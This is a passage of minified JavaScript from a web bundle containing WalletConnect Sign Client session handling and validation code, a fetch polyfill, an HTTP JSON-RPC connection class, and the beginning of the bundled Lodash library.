this.sendError(r,e,t),this.client.logger.error(t)}},this.onSessionExtendResponse=(e,t)=>{const{id:r}=t;Ra(t)?this.events.emit(fn("session_extend",r),{}):fo(t)&&this.events.emit(fn("session_extend",r),{error:t.error})},this.onSessionPingRequest=async(e,t)=>{const{id:r}=t;try{this.isValidPing({topic:e}),await this.sendResult({id:r,topic:e,result:!0}),this.client.events.emit("session_ping",{id:r,topic:e})}catch(t){await this.sendError(r,e,t),this.client.logger.error(t)}},this.onSessionPingResponse=(e,t)=>{const{id:r}=t;setTimeout((()=>{Ra(t)?this.events.emit(fn("session_ping",r),{}):fo(t)&&this.events.emit(fn("session_ping",r),{error:t.error})}),500)},this.onSessionDeleteRequest=async(e,t)=>{const{id:r}=t;try{this.isValidDisconnect({topic:e,reason:t.params}),await Promise.all([new Promise((t=>{this.client.core.relayer.once(ni.publish,(async()=>{t(await this.deleteSession(e))}))})),this.sendResult({id:r,topic:e,result:!0})]),this.client.events.emit("session_delete",{id:r,topic:e})}catch(e){this.client.logger.error(e)}},this.onSessionRequest=async(e,t)=>{const{id:r,params:n}=t;try{this.isValidRequest(Di({topic:e},n));const t=af(JSON.stringify(lf("wc_sessionRequest",n,r))),i=this.client.session.get(e),o={id:r,topic:e,params:n,verifyContext:await this.getVerifyContext(t,i.peer.metadata)};await this.setPendingSessionRequest(o),this.addSessionRequestToSessionRequestQueue(o),this.processSessionRequestQueue()}catch(t){await this.sendError(r,e,t),this.client.logger.error(t)}},this.onSessionRequestResponse=(e,t)=>{const{id:r}=t;Ra(t)?this.events.emit(fn("session_request",r),{result:t.result}):fo(t)&&this.events.emit(fn("session_request",r),{error:t.error})},this.onSessionEventRequest=async(e,t)=>{const{id:r,params:n}=t;try{const t=`${e}_session_event_${n.event.name}`,i=w1.get(t);if(i&&this.isRequestOutOfSync(i,r))return void this.client.logger.info(`Discarding out of sync request - ${r}`);this.isValidEmit(Di({topic:e},n)),this.client.events.emit("session_event",{id:r,topic:e,params:n}),w1.set(t,r)}catch(t){await this.sendError(r,e,t),this.client.logger.error(t)}},this.addSessionRequestToSessionRequestQueue=e=>{this.sessionRequestQueue.queue.push(e)},this.cleanupAfterResponse=e=>{this.deletePendingSessionRequest(e.response.id,{message:"fulfilled",code:0}),setTimeout((()=>{this.sessionRequestQueue.state=Aa.idle,this.processSessionRequestQueue()}),rt.toMiliseconds(this.requestQueueDelay))},this.processSessionRequestQueue=()=>{if(this.sessionRequestQueue.state===Aa.active)return void this.client.logger.info("session request queue is already active.");const e=this.sessionRequestQueue.queue[0];if(e)try{this.sessionRequestQueue.state=Aa.active,this.client.events.emit("session_request",e)}catch(e){this.client.logger.error(e)}else this.client.logger.info("session request queue is empty.")},this.onPairingCreated=e=>{if(e.active)return;const t=this.client.proposal.getAll().find((t=>t.pairingTopic===e.topic));t&&this.onSessionProposeRequest(e.topic,lf("wc_sessionPropose",{requiredNamespaces:t.requiredNamespaces,optionalNamespaces:t.optionalNamespaces,relays:t.relays,proposer:t.proposer},t.id))},this.isValidConnect=async e=>{if(!ji(e)){const{message:t}=je("MISSING_OR_INVALID",`connect() params: ${JSON.stringify(e)}`);throw new Error(t)}const{pairingTopic:t,requiredNamespaces:r,optionalNamespaces:n,sessionProperties:i,relays:o}=e;if(wi(t)||await this.isValidPairingTopic(t),!DV(o,!0)){const{message:e}=je("MISSING_OR_INVALID",`connect() relays: ${o}`);throw new Error(e)}!wi(r)&&0!==cf(r)&&this.validateNamespaces(r,"requiredNamespaces"),!wi(n)&&0!==cf(n)&&this.validateNamespaces(n,"optionalNamespaces"),wi(i)||this.validateSessionProps(i,"sessionProperties")},this.validateNamespaces=(e,t)=>{const r=kV(e,"connect()",t);if(r)throw new Error(r.message)},this.isValidApprove=async e=>{if(!ji(e))throw new Error(je("MISSING_OR_INVALID",`approve() params: ${e}`).message);const{id:t,namespaces:r,relayProtocol:n,sessionProperties:i}=e;await this.isValidProposalId(t);const o=this.client.proposal.get(t),s=J1(r,"approve()");if(s)throw new Error(s.message);const a=JE(o.requiredNamespaces,r,"approve()");if(a)throw new Error(a.message);if(!Nn(n,!0)){const{message:e}=je("MISSING_OR_INVALID",`approve() relayProtocol: ${n}`);throw new Error(e)}wi(i)||this.validateSessionProps(i,"sessionProperties")},this.isValidReject=async e=>{if(!ji(e)){const{message:t}=je("MISSING_OR_INVALID",`reject() params: ${e}`);throw new Error(t)}const{id:t,reason:r}=e;if(await this.isValidProposalId(t),!LV(r)){const{message:e}=je("MISSING_OR_INVALID",`reject() reason: ${JSON.stringify(r)}`);throw new Error(e)}},this.isValidSessionSettleRequest=e=>{if(!ji(e)){const{message:t}=je("MISSING_OR_INVALID",`onSessionSettleRequest() params: ${e}`);throw new Error(t)}const{relay:t,controller:r,namespaces:n,expiry:i}=e;if(!iI(t)){const{message:e}=je("MISSING_OR_INVALID","onSessionSettleRequest() relay protocol should be a string");throw new Error(e)}const o=RV(r,"onSessionSettleRequest()");if(o)throw new Error(o.message);const s=J1(n,"onSessionSettleRequest()");if(s)throw new Error(s.message);if(vc(i)){const{message:e}=je("EXPIRED","onSessionSettleRequest()");throw new Error(e)}},this.isValidUpdate=async e=>{if(!ji(e)){const{message:t}=je("MISSING_OR_INVALID",`update() params: ${e}`);throw new Error(t)}const{topic:t,namespaces:r}=e;await this.isValidSessionTopic(t);const n=this.client.session.get(t),i=J1(r,"update()");if(i)throw new Error(i.message);const o=JE(n.requiredNamespaces,r,"update()");if(o)throw new Error(o.message)},this.isValidExtend=async e=>{if(!ji(e)){const{message:t}=je("MISSING_OR_INVALID",`extend() params: ${e}`);throw new Error(t)}const{topic:t}=e;await this.isValidSessionTopic(t)},this.isValidRequest=async e=>{if(!ji(e)){const{message:t}=je("MISSING_OR_INVALID",`request() params: ${e}`);throw new Error(t)}const{topic:t,request:r,chainId:n,expiry:i}=e;await this.isValidSessionTopic(t);const{namespaces:o}=this.client.session.get(t);if(!KE(o,n)){const{message:e}=je("MISSING_OR_INVALID",`request() chainId: ${n}`);throw new Error(e)}if(!BV(r)){const{message:e}=je("MISSING_OR_INVALID",`request() ${JSON.stringify(r)}`);throw new Error(e)}if(!UV(o,n,r.method)){const{message:e}=je("MISSING_OR_INVALID",`request() method: ${r.method}`);throw new Error(e)}if(i&&!qV(i,Bw)){const{message:e}=je("MISSING_OR_INVALID",`request() expiry: ${i}. Expiry must be a number (in seconds) between ${Bw.min} and ${Bw.max}`);throw new Error(e)}},this.isValidRespond=async e=>{if(!ji(e)){const{message:t}=je("MISSING_OR_INVALID",`respond() params: ${e}`);throw new Error(t)}const{topic:t,response:r}=e;if(await this.isValidSessionTopic(t),!FV(r)){const{message:e}=je("MISSING_OR_INVALID",`respond() response: ${JSON.stringify(r)}`);throw new Error(e)}},this.isValidPing=async e=>{if(!ji(e)){const{message:t}=je("MISSING_OR_INVALID",`ping() params: ${e}`);throw new Error(t)}const{topic:t}=e;await this.isValidSessionOrPairingTopic(t)},this.isValidEmit=async e=>{if(!ji(e)){const{message:t}=je("MISSING_OR_INVALID",`emit() params: ${e}`);throw new Error(t)}const{topic:t,event:r,chainId:n}=e;await this.isValidSessionTopic(t);const{namespaces:i}=this.client.session.get(t);if(!KE(i,n)){const{message:e}=je("MISSING_OR_INVALID",`emit() chainId: ${n}`);throw new Error(e)}if(!jV(r)){const{message:e}=je("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(r)}`);throw new Error(e)}if(!WV(i,n,r.name)){const{message:e}=je("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(r)}`);throw new Error(e)}},this.isValidDisconnect=async e=>{if(!ji(e)){const{message:t}=je("MISSING_OR_INVALID",`disconnect() params: ${e}`);throw new Error(t)}const{topic:t}=e;await this.isValidSessionOrPairingTopic(t)},this.getVerifyContext=async(e,t)=>{const r={verified:{verifyUrl:t.verifyUrl||Y1,validation:"UNKNOWN",origin:t.url||""}};try{const n=await this.client.core.verify.resolve({attestationId:e,verifyUrl:t.verifyUrl});n&&(r.verified.origin=n.origin,r.verified.isScam=n.isScam,r.verified.validation=n.origin===new URL(t.url).origin?"VALID":"INVALID")}catch(e){this.client.logger.info(e)}return this.client.logger.info(`Verify context: ${JSON.stringify(r)}`),r},this.validateSessionProps=(e,t)=>{Object.values(e).forEach((e=>{if(!Nn(e,!1)){const{message:r}=je("MISSING_OR_INVALID",`${t} must be in Record<string, string> format. Received: ${JSON.stringify(e)}`);throw new Error(r)}}))}}async isInitialized(){if(!this.initialized){const{message:e}=je("NOT_INITIALIZED",this.name);throw new Error(e)}await this.client.core.relayer.confirmOnlineStateOrThrow()}registerRelayerEvents(){this.client.core.relayer.on(ni.message,(async e=>{const{topic:t,message:r}=e;if(this.ignoredPayloadTypes.includes(this.client.core.crypto.getPayloadType(r)))return;const n=await this.client.core.crypto.decode(t,r);try{n_(n)?(this.client.core.history.set(t,n),this.onRelayEventRequest({topic:t,payload:n})):Dv(n)?(await this.client.core.history.resolve(n),await this.onRelayEventResponse({topic:t,payload:n}),this.client.core.history.delete(t,n.id)):this.onRelayEventUnknownPayload({topic:t,payload:n})}catch(e){this.client.logger.error(e)}}))}registerExpirerEvents(){this.client.core.expirer.on(Rs.expired,(async e=>{const{topic:t,id:r}=rI(e.target);if(r&&this.client.pendingRequest.keys.includes(r))return await this.deletePendingSessionRequest(r,je("EXPIRED"),!0);t?this.client.session.keys.includes(t)&&(await this.deleteSession(t,!0),this.client.events.emit("session_expire",{topic:t})):r&&(await this.deleteProposal(r,!0),this.client.events.emit("proposal_expire",{id:r}))}))}registerPairingEvents(){this.client.core.pairing.events.on(_d.create,(e=>this.onPairingCreated(e)))}isValidPairingTopic(e){if(!Nn(e,!1)){const{message:t}=je("MISSING_OR_INVALID",`pairing topic should be a string: ${e}`);throw new Error(t)}if(!this.client.core.pairing.pairings.keys.includes(e)){const{message:t}=je("NO_MATCHING_KEY",`pairing topic doesn't exist: ${e}`);throw new Error(t)}if(vc(this.client.core.pairing.pairings.get(e).expiry)){const{message:t}=je("EXPIRED",`pairing topic: ${e}`);throw new Error(t)}}async isValidSessionTopic(e){if(!Nn(e,!1)){const{message:t}=je("MISSING_OR_INVALID",`session topic should be a string: ${e}`);throw new Error(t)}if(!this.client.session.keys.includes(e)){const{message:t}=je("NO_MATCHING_KEY",`session topic doesn't exist: ${e}`);throw new Error(t)}if(vc(this.client.session.get(e).expiry)){await this.deleteSession(e);const{message:t}=je("EXPIRED",`session topic: ${e}`);throw new Error(t)}}async isValidSessionOrPairingTopic(e){if(this.client.session.keys.includes(e))await this.isValidSessionTopic(e);else{if(!this.client.core.pairing.pairings.keys.includes(e)){if(Nn(e,!1)){const{message:t}=je("NO_MATCHING_KEY",`session or pairing topic doesn't exist: ${e}`);throw new Error(t)}{const{message:t}=je("MISSING_OR_INVALID",`session or pairing topic should be a string: ${e}`);throw new Error(t)}}this.isValidPairingTopic(e)}}async isValidProposalId(e){if(!$V(e)){const{message:t}=je("MISSING_OR_INVALID",`proposal id should be a number: ${e}`);throw new Error(t)}if(!this.client.proposal.keys.includes(e)){const{message:t}=je("NO_MATCHING_KEY",`proposal id doesn't exist: ${e}`);throw new Error(t)}if(vc(this.client.proposal.get(e).expiry)){await this.deleteProposal(e);const{message:t}=je("EXPIRED",`proposal id: ${e}`);throw new Error(t)}}}class pQ extends Lv{constructor(e,t){super(e,t,nQ,o_),this.core=e,this.logger=t}}class gQ extends Lv{constructor(e,t){super(e,t,iQ,o_),this.core=e,this.logger=t}}class vQ extends Lv{constructor(e,t){super(e,t,oQ,o_,(e=>e.id)),this.core=e,this.logger=t}}let mQ=class e extends GG{constructor(e){super(e),this.protocol=DI,this.version=2,this.name=Lw.name,this.events=new ai.EventEmitter,this.on=(e,t)=>this.events.on(e,t),this.once=(e,t)=>this.events.once(e,t),this.off=(e,t)=>this.events.off(e,t),this.removeListener=(e,t)=>this.events.removeListener(e,t),this.removeAllListeners=e=>this.events.removeAllListeners(e),this.connect=async e=>{try{return await this.engine.connect(e)}catch(e){throw this.logger.error(e.message),e}},this.pair=async e=>{try{return await this.engine.pair(e)}catch(e){throw this.logger.error(e.message),e}},this.approve=async e=>{try{return await this.engine.approve(e)}catch(e){throw this.logger.error(e.message),e}},this.reject=async e=>{try{return await this.engine.reject(e)}catch(e){throw this.logger.error(e.message),e}},this.update=async e=>{try{return await this.engine.update(e)}catch(e){throw this.logger.error(e.message),e}},this.extend=async e=>{try{return await this.engine.extend(e)}catch(e){throw this.logger.error(e.message),e}},this.request=async e=>{try{return await this.engine.request(e)}catch(e){throw this.logger.error(e.message),e}},this.respond=async e=>{try{return await this.engine.respond(e)}catch(e){throw this.logger.error(e.message),e}},this.ping=async e=>{try{return await this.engine.ping(e)}catch(e){throw this.logger.error(e.message),e}},this.emit=async e=>{try{return await this.engine.emit(e)}catch(e){throw this.logger.error(e.message),e}},this.disconnect=async e=>{try{return await this.engine.disconnect(e)}catch(e){throw this.logger.error(e.message),e}},this.find=e=>{try{return this.engine.find(e)}catch(e){throw this.logger.error(e.message),e}},this.getPendingSessionRequests=()=>{try{return this.engine.getPendingSessionRequests()}catch(e){throw this.logger.error(e.message),e}},this.name=(null==e?void 0:e.name)||Lw.name,this.metadata=(null==e?void 0:e.metadata)||Xq();const t=typeof(null==e?void 0:e.logger)<"u"&&"string"!=typeof(null==e?void 0:e.logger)?e.logger:nr.pino(nr.getDefaultLoggerOptions({level:(null==e?void 0:e.logger)||Lw.logger}));this.core=(null==e?void 0:e.core)||new rQ(e),this.logger=nr.generateChildLogger(t,this.name),this.session=new gQ(this.core,this.logger),this.proposal=new pQ(this.core,this.logger),this.pendingRequest=new vQ(this.core,this.logger),this.engine=new dQ(this)}static async init(t){const r=new e(t);return await r.initialize(),r}get context(){return nr.getLoggerContext(this.logger)}get pairing(){return this.core.pairing.pairings}async initialize(){this.logger.trace("Initialized");try{await this.core.start(),await this.session.init(),await this.proposal.init(),await this.pendingRequest.init(),await this.engine.init(),this.core.verify.init({verifyUrl:this.metadata.verifyUrl}),this.logger.info("SignClient Initialization Success")}catch(e){throw this.logger.info("SignClient Initialization Failure"),this.logger.error(e.message),e}}};var N2={exports:{}};!function(e,t){var r,n=typeof self<"u"?self:Ue,i=function(){function e(){this.fetch=!1,this.DOMException=n.DOMException}return e.prototype=n,new e}();r=i,function(e){var t="URLSearchParams"in r,n="Symbol"in r&&"iterator"in Symbol,i="FileReader"in r&&"Blob"in r&&function(){try{return new Blob,!0}catch{return!1}}(),o="FormData"in r,s="ArrayBuffer"in r;if(s)var a=["[object Int8Array]","[object Uint8Array]","[object Uint8ClampedArray]","[object Int16Array]","[object Uint16Array]","[object Int32Array]","[object Uint32Array]","[object Float32Array]","[object Float64Array]"],c=ArrayBuffer.isView||function(e){return e&&a.indexOf(Object.prototype.toString.call(e))>-1};function l(e){if("string"!=typeof e&&(e=String(e)),/[^a-z0-9\-#$%&'*+.^_`|~]/i.test(e))throw new TypeError("Invalid character in header field name");return e.toLowerCase()}function u(e){return"string"!=typeof e&&(e=String(e)),e}function h(e){var t={next:function(){var t=e.shift();return{done:void 0===t,value:t}}};return n&&(t[Symbol.iterator]=function(){return t}),t}function d(e){this.map={},e instanceof d?e.forEach((function(e,t){this.append(t,e)}),this):Array.isArray(e)?e.forEach((function(e){this.append(e[0],e[1])}),this):e&&Object.getOwnPropertyNames(e).forEach((function(t){this.append(t,e[t])}),this)}function f(e){if(e.bodyUsed)return Promise.reject(new TypeError("Already read"));e.bodyUsed=!0}function p(e){return new Promise((function(t,r){e.onload=function(){t(e.result)},e.onerror=function(){r(e.error)}}))}function g(e){var t=new FileReader,r=p(t);return t.readAsArrayBuffer(e),r}function m(e){if(e.slice)return e.slice(0);var t=new Uint8Array(e.byteLength);return t.set(new Uint8Array(e)),t.buffer}function v(){return this.bodyUsed=!1,this._initBody=function(e){this._bodyInit=e,e?"string"==typeof e?this._bodyText=e:i&&Blob.prototype.isPrototypeOf(e)?this._bodyBlob=e:o&&FormData.prototype.isPrototypeOf(e)?this._bodyFormData=e:t&&URLSearchParams.prototype.isPrototypeOf(e)?this._bodyText=e.toString():s&&i&&function(e){return e&&DataView.prototype.isPrototypeOf(e)}(e)?(this._bodyArrayBuffer=m(e.buffer),this._bodyInit=new Blob([this._bodyArrayBuffer])):s&&(ArrayBuffer.prototype.isPrototypeOf(e)||c(e))?this._bodyArrayBuffer=m(e):this._bodyText=e=Object.prototype.toString.call(e):this._bodyText="",this.headers.get("content-type")||("string"==typeof e?this.headers.set("content-type","text/plain;charset=UTF-8"):this._bodyBlob&&this._bodyBlob.type?this.headers.set("content-type",this._bodyBlob.type):t&&URLSearchParams.prototype.isPrototypeOf(e)&&this.headers.set("content-type","application/x-www-form-urlencoded;charset=UTF-8"))},i&&(this.blob=function(){var e=f(this);if(e)return e;if(this._bodyBlob)return Promise.resolve(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve(new Blob([this._bodyArrayBuffer]));if(this._bodyFormData)throw new Error("could not read FormData body as blob");return Promise.resolve(new Blob([this._bodyText]))},this.arrayBuffer=function(){return this._bodyArrayBuffer?f(this)||Promise.resolve(this._bodyArrayBuffer):this.blob().then(g)}),this.text=function(){var e=f(this);if(e)return e;if(this._bodyBlob)return function(e){var t=new FileReader,r=p(t);return t.readAsText(e),r}(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve(function(e){for(var t=new Uint8Array(e),r=new Array(t.length),n=0;n<t.length;n++)r[n]=String.fromCharCode(t[n]);return r.join("")}(this._bodyArrayBuffer));if(this._bodyFormData)throw new Error("could not read FormData body as text");return Promise.resolve(this._bodyText)},o&&(this.formData=function(){return this.text().then(w)}),this.json=function(){return this.text().then(JSON.parse)},this}d.prototype.append=function(e,t){e=l(e),t=u(t);var r=this.map[e];this.map[e]=r?r+", "+t:t},d.prototype.delete=function(e){delete this.map[l(e)]},d.prototype.get=function(e){return e=l(e),this.has(e)?this.map[e]:null},d.prototype.has=function(e){return this.map.hasOwnProperty(l(e))},d.prototype.set=function(e,t){this.map[l(e)]=u(t)},d.prototype.forEach=function(e,t){for(var r in this.map)this.map.hasOwnProperty(r)&&e.call(t,this.map[r],r,this)},d.prototype.keys=function(){var e=[];return this.forEach((function(t,r){e.push(r)})),h(e)},d.prototype.values=function(){var e=[];return this.forEach((function(t){e.push(t)})),h(e)},d.prototype.entries=function(){var e=[];return this.forEach((function(t,r){e.push([r,t])})),h(e)},n&&(d.prototype[Symbol.iterator]=d.prototype.entries);var y=["DELETE","GET","HEAD","OPTIONS","POST","PUT"];function b(e,t){var r=(t=t||{}).body;if(e instanceof b){if(e.bodyUsed)throw new TypeError("Already read");this.url=e.url,this.credentials=e.credentials,t.headers||(this.headers=new d(e.headers)),this.method=e.method,this.mode=e.mode,this.signal=e.signal,!r&&null!=e._bodyInit&&(r=e._bodyInit,e.bodyUsed=!0)}else this.url=String(e);if(this.credentials=t.credentials||this.credentials||"same-origin",(t.headers||!this.headers)&&(this.headers=new d(t.headers)),this.method=function(e){var t=e.toUpperCase();return y.indexOf(t)>-1?t:e}(t.method||this.method||"GET"),this.mode=t.mode||this.mode||null,this.signal=t.signal||this.signal,this.referrer=null,("GET"===this.method||"HEAD"===this.method)&&r)throw new TypeError("Body not allowed for GET or HEAD requests");this._initBody(r)}function w(e){var t=new FormData;return e.trim().split("&").forEach((function(e){if(e){var r=e.split("="),n=r.shift().replace(/\+/g," "),i=r.join("=").replace(/\+/g," ");t.append(decodeURIComponent(n),decodeURIComponent(i))}})),t}function _(e){var t=new d;return e.replace(/\r?\n[\t ]+/g," ").split(/\r?\n/).forEach((function(e){var r=e.split(":"),n=r.shift().trim();if(n){var i=r.join(":").trim();t.append(n,i)}})),t}function E(e,t){t||(t={}),this.type="default",this.status=void 0===t.status?200:t.status,this.ok=this.status>=200&&this.status<300,this.statusText="statusText"in t?t.statusText:"OK",this.headers=new d(t.headers),this.url=t.url||"",this._initBody(e)}b.prototype.clone=function(){return new b(this,{body:this._bodyInit})},v.call(b.prototype),v.call(E.prototype),E.prototype.clone=function(){return new E(this._bodyInit,{status:this.status,statusText:this.statusText,headers:new d(this.headers),url:this.url})},E.error=function(){var e=new E(null,{status:0,statusText:""});return e.type="error",e};var x=[301,302,303,307,308];E.redirect=function(e,t){if(-1===x.indexOf(t))throw new RangeError("Invalid status code");return new E(null,{status:t,headers:{location:e}})},e.DOMException=r.DOMException;try{new e.DOMException}catch{e.DOMException=function(e,t){this.message=e,this.name=t;var r=Error(e);this.stack=r.stack},e.DOMException.prototype=Object.create(Error.prototype),e.DOMException.prototype.constructor=e.DOMException}function S(t,r){return new Promise((function(n,o){var s=new b(t,r);if(s.signal&&s.signal.aborted)return o(new e.DOMException("Aborted","AbortError"));var a=new XMLHttpRequest;function c(){a.abort()}a.onload=function(){var e={status:a.status,statusText:a.statusText,headers:_(a.getAllResponseHeaders()||"")};e.url="responseURL"in a?a.responseURL:e.headers.get("X-Request-URL");var t="response"in a?a.response:a.responseText;n(new E(t,e))},a.onerror=function(){o(new TypeError("Network request failed"))},a.ontimeout=function(){o(new TypeError("Network request failed"))},a.onabort=function(){o(new e.DOMException("Aborted","AbortError"))},a.open(s.method,s.url,!0),"include"===s.credentials?a.withCredentials=!0:"omit"===s.credentials&&(a.withCredentials=!1),"responseType"in a&&i&&(a.responseType="blob"),s.headers.forEach((function(e,t){a.setRequestHeader(t,e)})),s.signal&&(s.signal.addEventListener("abort",c),a.onreadystatechange=function(){4===a.readyState&&s.signal.removeEventListener("abort",c)}),a.send(typeof s._bodyInit>"u"?null:s._bodyInit)}))}S.polyfill=!0,r.fetch||(r.fetch=S,r.Headers=d,r.Request=b,r.Response=E),e.Headers=d,e.Request=b,e.Response=E,e.fetch=S,Object.defineProperty(e,"__esModule",{value:!0})}({}),i.fetch.ponyfill=!0,delete i.fetch.polyfill;var o=i;(t=o.fetch).default=o.fetch,t.fetch=o.fetch,t.Headers=o.Headers,t.Request=o.Request,t.Response=o.Response,e.exports=t}(N2,N2.exports);var bQ=N2.exports;const Wx=tu(bQ),wQ={Accept:"application/json","Content-Type":"application/json"},yQ="POST",zx={headers:wQ,method:yQ},Hx=10;class Kc{constructor(e,t=!1){if(this.url=e,this.disableProviderPing=t,this.events=new ai.EventEmitter,this.isAvailable=!1,this.registering=!1,!vx(e))throw new Error(`Provided URL is not compatible with HTTP connection: ${e}`);this.url=e,this.disableProviderPing=t}get connected(){return this.isAvailable}get connecting(){return this.registering}on(e,t){this.events.on(e,t)}once(e,t){this.events.once(e,t)}off(e,t){this.events.off(e,t)}removeListener(e,t){this.events.removeListener(e,t)}async open(e=this.url){await this.register(e)}async close(){if(!this.isAvailable)throw new Error("Connection already closed");this.onClose()}async send(e,t){this.isAvailable||await this.register();try{const t=ql(e),r=await(await Wx(this.url,Object.assign(Object.assign({},zx),{body:t}))).json();this.onPayload({data:r})}catch(t){this.onError(e.id,t)}}async register(e=this.url){if(!vx(e))throw new Error(`Provided URL is not compatible with HTTP connection: ${e}`);if(this.registering){const e=this.events.getMaxListeners();return(this.events.listenerCount("register_error")>=e||this.events.listenerCount("open")>=e)&&this.events.setMaxListeners(e+1),new Promise(((e,t)=>{this.events.once("register_error",(e=>{this.resetMaxListeners(),t(e)})),this.events.once("open",(()=>{if(this.resetMaxListeners(),typeof this.isAvailable>"u")return t(new Error("HTTP connection is missing or invalid"));e()}))}))}this.url=e,this.registering=!0;try{if(!this.disableProviderPing){const t=ql({id:1,jsonrpc:"2.0",method:"test",params:[]});await Wx(e,Object.assign(Object.assign({},zx),{body:t}))}this.onOpen()}catch(e){const t=this.parseError(e);throw this.events.emit("register_error",t),this.onClose(),t}}onOpen(){this.isAvailable=!0,this.registering=!1,this.events.emit("open")}onClose(){this.isAvailable=!1,this.registering=!1,this.events.emit("close")}onPayload(e){if(typeof e.data>"u")return;const t="string"==typeof e.data?L0(e.data):e.data;this.events.emit("payload",t)}onError(e,t){const r=this.parseError(t),n=kv(e,r.message||r.toString());this.events.emit("payload",n)}parseError(e,t=this.url){return vI(e,t,"HTTP")}resetMaxListeners(){this.events.getMaxListeners()>10&&this.events.setMaxListeners(10)}}const qx="error",_Q="wss://relay.walletconnect.com",EQ="wc",xQ="universal_provider",Vx=`${EQ}@2:${xQ}:`,SQ="https://rpc.walletconnect.com/v1/",Ja={DEFAULT_CHAIN_CHANGED:"default_chain_changed"};var sd=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{},O2={exports:{}};
/**
* @license
* Lodash <https://lodash.com/>
* Copyright OpenJS Foundation and other contributors <https://openjsf.org/>
* Released under MIT license <https://lodash.com/license>
* Based on Underscore.js 1.8.3 <http://underscorejs.org/LICENSE>
* Copyright Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors
*/!function(e,t){(function(){var r,n="Expected a function",i="__lodash_hash_undefined__",o="__lodash_placeholder__",s=16,a=32,c=64,l=128,u=256,h=1/0,d=9007199254740991,f=NaN,p=4294967295,g=[["ary",l],["bind",1],["bindKey",2],["curry",8],["curryRight",s],["flip",512],["partial",a],["partialRight",c],["rearg",u]],m="[object Arguments]",v="[object Array]",y="[object Boolean]",b="[object Date]",w="[object Error]",_="[object Function]",E="[object GeneratorFunction]",x="[object Map]",S="[object Number]",A="[object Object]",C="[object Promise]",I="[object RegExp]",k="[object Set]",N="[object String]",R="[object Symbol]",T="[object WeakMap]",O="[object ArrayBuffer]",P="[object DataView]",M="[object Float32Array]",j="[object Float64Array]",L="[object Int8Array]",D="[object Int16Array]",B="[object Int32Array]",U="[object Uint8Array]",$="[object Uint8ClampedArray]",z="[object Uint16Array]",F="[object Uint32Array]",H=/\b__p \+= '';/g,q=/\b(__p \+=) '' \+/g,W=/(__e\(.*?\)|\b__t\)) \+\n'';/g,V=/&(?:amp|lt|gt|quot|#39);/g,G=/[&<>"']/g,K=RegExp(V.source),Z=RegExp(G.source),Y=/<%-([\s\S]+?)%>/g,J=/<%([\s\S]+?)%>/g,Q=/<%=([\s\S]+?)%>/g,X=/\.|\[(?:[^[\]]*|(["'])(?:(?!\1)[^\\]|\\.)*?\1)\]/,ee=/^\w*$/,te=/[^.[\]]+|\[(?:(-?\d+(?:\.\d+)?)|(["'])((?:(?!\2)[^\\]|\\.)*?)\2)\]|(?=(?:\.|\[\])(?:\.|\[\]|$))/g,re=/[\\^$.*+?()[\]{}|]/g,ne=RegExp(re.source),ie=/^\s+/,oe=/\s/,se=/\{(?:\n\/\* \[wrapped with .+\] \*\/)?\n?/,ae=/\{\n\/\* \[wrapped with (.+)\] \*/,ce=/,? & /,le=/[^\x00-\x2f\x3a-\x40\x5b-\x60\x7b-\x7f]+/g,ue=/[()=,{}\[\]\/\s]/,he=/\\(\\)?/g,de=/\$\{([^\\}]*(?:\\.[^\\}]*)*)\}/g,fe=/\w*$/,pe=/^[-+]0x[0-9a-f]+$/i,ge=/^0b[01]+$/i,me=/^\[object .+?Constructor\]$/,ve=/^0o[0-7]+$/i,ye=/^(?:0|[1-9]\d*)$/,be=/[\xc0-\xd6\xd8-\xf6\xf8-\xff\u0100-\u017f]/g,we=/($^)/,_e=/['\n\r\u2028\u2029\\]/g,Ee="\\ud800-\\udfff",xe="\\u0300-\\u036f\\ufe20-\\ufe2f\\u20d0-\\u20ff",Se="\\u2700-\\u27bf",Ae="a-z\\xdf-\\xf6\\xf8-\\xff",Ce="A-Z\\xc0-\\xd6\\xd8-\\xde",Ie="\\ufe0e\\ufe0f",ke="\\xac\\xb1\\xd7\\xf7\\x00-\\x2f\\x3a-\\x40\\x5b-\\x60\\x7b-\\xbf\\u2000-\\u206f \\t\\x0b\\f\\xa0\\ufeff\\n\\r\\u2028\\u2029\\u1680\\u180e\\u2000\\u2001\\u2002\\u2003\\u2004\\u2005\\u2006\\u2007\\u2008\\u2009\\u200a\\u202f\\u205f\\u3000",Ne="['’]",Re="["+Ee+"]",Te="["+ke+"]",Oe="["+xe+"]",Pe="\\d+",Me="["+Se+"]",je="["+Ae+"]",Le="[^"+Ee+ke+Pe+Se+Ae+Ce+"]",De="\\ud83c[\\udffb-\\udfff]",Be="[^"+Ee+"]",Ue="(?:\\ud83c[\\udde6-\\uddff]){2}",$e="[\\ud800-\\udbff][\\udc00-\\udfff]",ze="["+Ce+"]",Fe="\\u200d",He="(?:"+je+"|"+Le+")",qe="(?:"+ze+"|"+Le+")",We="(?:['’](?:d|ll|m|re|s|t|ve))?",Ve="(?:['’](?:D|LL|M|RE|S|T|VE))?",Ge="(?:"+Oe+"|"+De+")"+"?",Ke="["+Ie+"]?",Ze=Ke+Ge+("(?:"+Fe+"(?:"+[Be,Ue,$e].join("|")+")"+Ke+Ge+")*"),Ye="(?:"+[Me,Ue,$e].join("|")+")"+Ze,Je="(?:"+[Be+Oe+"?",Oe,Ue,$e,Re].join("|")+")",Qe=RegExp(Ne,"g"),Xe=RegExp(Oe,"g"),et=RegExp(De+"(?="+De+")|"+Je+Ze,"g"),tt=RegExp([ze+"?"+je+"+"+We+"(?="+[Te,ze,"$"].join("|")+")",qe+"+"+Ve+"(?="+[Te,ze+He,"$"].join("|")+")",ze+"?"+He+"+"+We,ze+"+"+Ve,"\\d*(?:1ST|2ND|3RD|(?![123])\\dTH)(?=\\b|[a-z_])","\\d*(?:1st|2nd|3rd|(?![123])\\dth)(?=\\b|[A-Z_])",Pe,Ye].join("|"),"g"),rt=RegExp("["+Fe+Ee+xe+Ie+"]"),nt=/[a-z][A-Z]|[A-Z]{2}[a-z]|[0-9][a-zA-Z]|[a-zA-Z][0-9]|[^a-zA-Z0-9 